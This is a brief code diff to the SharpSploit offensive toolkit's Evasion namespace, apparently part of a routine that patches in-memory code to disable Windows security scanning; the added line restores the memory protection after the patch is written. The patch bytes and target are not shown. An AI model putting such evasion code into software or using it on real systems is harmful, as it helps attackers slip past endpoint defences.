@@ -47,6 +47,7 @@ namespace SharpSploit.Evasion
                 uint oldProtect;
                 PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                 Marshal.Copy(patch, 0, address, patch.Length);
+				PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                 return true;
             }
             catch
